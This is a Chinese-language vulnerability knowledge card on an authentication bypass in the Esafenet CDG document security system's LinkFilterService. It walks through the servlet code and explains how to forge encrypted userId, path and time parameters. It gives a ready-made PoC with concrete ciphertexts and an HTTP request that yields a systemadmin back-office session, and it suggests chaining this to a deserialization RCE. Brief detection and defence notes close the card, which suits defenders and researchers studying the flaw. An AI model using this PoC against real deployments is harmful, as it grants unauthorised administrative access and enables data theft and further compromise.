---
id: web-java-component-esafenet-cdg-linkfilterservice-auth-bypass
title: 亿赛通 CDG LinkFilterService 权限绕过：path/userId/cur 经 CDGUtil 加密直传，构造 systemadmin 会话进入后台
type: scenario
domain: web
path: web/java/component
technique: esafenet-cdg-linkfilterservice-auth-bypass
tags:
- java
- esafenet
- cdg
- auth-bypass
- servlet
- session
- oa
cve: []
affected_versions: 亿赛通电子文档安全管理系统 V5.0（原文复现环境；原文仅称旧版本，未给版本区间）
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V541
  verified_at: '2026-11-11T19:16:33+08:00'
  notes: 已对照原文与 18 张截图（图01-14）核对：web.xml LinkFilter→/LinkFilterService、service 中 path/userId/cur 均 CDGUtil.decode、path 含 /client/AppExamList.jsp?username= 时提前 return（图03/10）、isOverTime 差值/1000>=exam.timeout=600（图05/06/07）、buildSessionId→findUserById(USER_NAME=?)→LoginMng.login(user)→session.setAttribute(loginMng)（图08/09）、buildLinkURL 无?时 scheme://host:port+contextPath+path+;jsessionid=sId（图04）、systemadmin 直接进 V5.0 后台（图13）均一致；受影响版本按原文只称『旧版本』，卡内如实标注 V5.0 为原文复现环境、未猜区间，符合库内惯例，不 clear。核实并修正：PoC 中 userid 密文原缺一个 G，已按截图/请求体/原文更正为 GCGHGAGGFAFHFGFCFEFPFD（cur=KKPCJHNBBFBFFHOFBKENGDGFNGIBLBLBCJCPCP、path=BOFGGPFBFIFPBHFMGKGi 无误）。dedup：仅与 CDG DecryptApplication 文件读取、CDG uploadSoftWareFile 上传、FE 登录绕过等 related，接口/机制不同，非同一链；dup-scan 无本篇 pair。未验证点：未复现，密文由厂商 jar 生成、换环境可能不同。
url: /docs/web/java/component/web-java-component-esafenet-cdg-linkfilterservice-auth-bypass/
draft: false
kb_aliases:
- 亿赛通权限绕过
- LinkFilterService
- com.esafenet.filter.LinkFilter
- CDGUtil.encode
- 电子文档安全管理系统 未授权
- systemadmin 会话
---

## 一句话结论

亿赛通电子文档安全管理系统的 `/CDGServer3/LinkFilterService`（`com.esafenet.filter.LinkFilter`）把请求参数 `path`、`userId`、`cur` 用 `CDGUtil.decode` 解密后直接用于构建登录会话与跳转地址：只要 `path` 不含 `/client/AppExamList.jsp?username=` 标记、`cur` 时间未超过 600 秒超时，就用 `userId` 对应的用户（如 `systemadmin`）调用 `LoginMng.login(user)` 建立登录态并 302 到 `path` 指定页面，前端攻击者无需任何凭据即可进入后台。

## 原理

- `web.xml` 把 `/LinkFilterService` 映射到 `com.esafenet.filter.LinkFilter`；`service()` 逻辑：
  ```java
  String path = CDGUtil.decode(RequestUtil.getParameter(request, "path", ""));
  String userId = CDGUtil.decode(RequestUtil.getParameter(request, "userId", ""));
  String time = CDGUtil.decode(RequestUtil.getParameter(request, "cur", ""));
  if (path.indexOf("/client/AppExamList.jsp?username=") != -1) {
      sId = CDGUtil.encode(path.substring(path.indexOf("=") + 1));
      languageflag = this.buildLinkURL(request, path, sId);
      response.sendRedirect(languageflag);
      return;   // 这个分支提前结束，不能用于登录
  }
  if (this.isOverTime(time)) { ... return; }
  sId = this.buildSessionId(request, userId);
  languageflag = this.buildLinkURL(request, path, sId);
  response.sendRedirect(languageflag);
  ```
- `isOverTime(time)` 把 `cur` 解析为 `yyyy-MM-dd HH:mm:ss`，用当前时间减去它，除以 1000 得到秒数，若 `>= exam.timeout`（配置文件 `exam.timeout=600`）即超时返回 true 并提前结束；把 `cur` 设为未来时间（差值负）即可通过。
- `buildSessionId(request, userId)`：
  ```java
  User user = userDao.findUserById(userId);
  LoginMng loginMng = (LoginMng) session.getAttribute("loginMng");
  if (loginMng == null || !loginMng.isLogin()) {
      loginMng = new LoginMng();
      loginMng.login(user);              // 直接以查到的用户登录
      session.setAttribute("loginMng", loginMng);
  }
  return session.getId();
  ```
  `findUserById` 执行 `select * from WF_USER where USER_NAME = ?`（参数化查询，userId 实际被当成用户名），返回对应用户后 `LoginMng.login(User)` 把 `isLogin` 置 true，并按用户名/ID 判断是否 admin。
- `buildLinkURL` 把 `path` 与 `session.getId()` 拼成 `http://host:port<contextPath><path>;jsessionid=<sid>` 并 302，攻击者跟随该地址即携带新会话进入后台。
- 之所以成立：该 servlet 位于前台、没有登录校验，却把“用户身份”完全交给客户端提供的加密参数；加密只是编码而非签名，攻击者可直接调用厂商 jar 里的 `CDGUtil.encode` 生成合法密文，服务端无法区分请求是否来自合法登录流程。

## 触发条件

- 目标为存在 LinkFilterService 的亿赛通旧版本（原文复现 V5.0）。
- `/CDGServer3/LinkFilterService` 可从外网访问，且未加额外网关鉴权。
- 攻击者取得厂商 jar（含 `CDGUtil`）以生成加密参数，或自行实现相同编码。
- 目标存在已知用户名（默认管理员 `systemadmin`）。

## 利用步骤

1. 从目标安装包/官方客户端取得 `CDGUtil` 所在 jar，导入本地 Java 工程。
2. 调用 `CDGUtil.encode` 分别加密三个明文：`userId=systemadmin`、`cur=2099-11-11 12:12:12`（未来时间）、`path=/frame.jsp`（后台页面）。
3. 发送 POST 表单：
   ```http
   POST /CDGServer3/LinkFilterService HTTP/1.1
   Host: target
   Content-Type: application/x-www-form-urlencoded

   path=<encode(/frame.jsp)>&userId=<encode(systemadmin)>&cur=<encode(2099-11-11 12:12:12)>
   ```
4. 响应 302 到 `/CDGServer3/frame.jsp;jsessionid=<新会话ID>`，跟随访问即进入后台（原文页面显示“电子文档安全管理系统 V5.0，欢迎：系统管理员(SystemAdmin)”）。
5. 用该会话继续调用后台功能；若需 RCE，可接 `/dlpPolicy/importPolicy.do` 反序列化（见关联卡）。

## PoC

原文 Java 生成密文：

```java
System.out.println("userid: " + encode("systemadmin"));
System.out.println("cur: " + encode("2099-11-11 12:12:12"));
System.out.println("path: " + encode("/frame.jsp"));
```

原文得到的密文示例：

```text
userid: GCGHGAGGFAFHFGFCFEFPFD
cur: KKPCJHNBBFBFFHOFBKENGDGFNGIBLBLBCJCPCP
path: BOFGGPFBFIFPBHFMGKGi
```

请求：

```http
POST /CDGServer3/LinkFilterService HTTP/1.1
Host: target

path=BOFGGPFBFIFPBHFMGKGi&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=KKPCJHNBBFBFFHOFBKENGDGFNGIBLBLBCJCPCP
```

## 变体与关联

- 变体：`path` 可换成任意后台页面（如策略管理、组织管理页面）；`userId` 可换成其他存在的用户名，admin 判定条件为 `userName=admin && userId=100400000001`（`systemadmin` 在原文环境可直接进后台）。
- 关联：[[web-java-component-esafenet-cdg-importpolicy-deserialization-rce]]（同一系统的后台反序列化 RCE，通常接在本卡之后）；[[web-generic-file-inclusion-cdg-decryptapplication-filepath-read]]、[[web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell]]（同为亿赛通 CDG 其他接口漏洞）。
- 边界：升级/打补丁后 LinkFilter 增加登录校验、或 `CDGUtil` 编码算法更换且旧密文失效时，该手法失效。

## 检测与防御

- 检测：访问 `/CDGServer3/LinkFilterService` 且请求体含 `path`/`userId`/`cur` 三个长密文参数；响应 302 并带 `;jsessionid=`；随后同一会话直接访问后台页面。
- 检测：非登录流程生成的 session 直接访问 `/CDGServer3/frame.jsp` 等后台页面；`cur` 解析为未来时间。
- 防御：LinkFilterService 增加登录/来源校验，不信任客户端提供的身份参数；对 `userId` 与当前会话绑定；升级到修复版本；网关侧限制该接口访问来源。
